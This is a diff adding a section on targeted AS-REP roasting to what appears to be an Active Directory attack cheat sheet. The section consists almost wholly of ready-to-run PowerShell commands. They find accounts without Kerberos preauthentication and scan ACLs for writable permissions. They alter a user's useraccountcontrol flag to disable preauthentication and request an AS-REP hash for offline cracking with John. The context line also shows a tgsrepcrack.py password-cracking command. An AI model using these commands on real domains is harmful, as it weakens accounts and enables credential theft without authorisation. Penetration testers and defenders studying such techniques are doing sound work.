@@ -390,3 +390,23 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\3-40a10000-svcadmin@MSSQLSvc~
 ```
 
 ### Targeted Kerberoasting AS REPs
+
+**1. Enumeration with Powerview dev Version:**
+```powershell
+# Enumerating accounts with Kerberos Preauth disabled
+Get-DomainUser -PreauthNotRequired -Verbose
+# Enumerating the permissions for RDPUsers on ACLs using
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+```
+**2. Enumeration with AD Module:**
+```powershell
+# Enumerating accounts with Kerberos Preauth disabled
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
+# Set unsolicited pre-authentication for test01 UAC settings
+Set-DomainObject -Identity test01 -XOR @{useraccountcontrol=4194304} -Verbose
+```
+**3. Request encrypted AS REP for offline brute force with John:**
+```powershell
+# Request encrypted AS REP
+Get-ASREPHash -UserName VPN1user -Verbose
+```
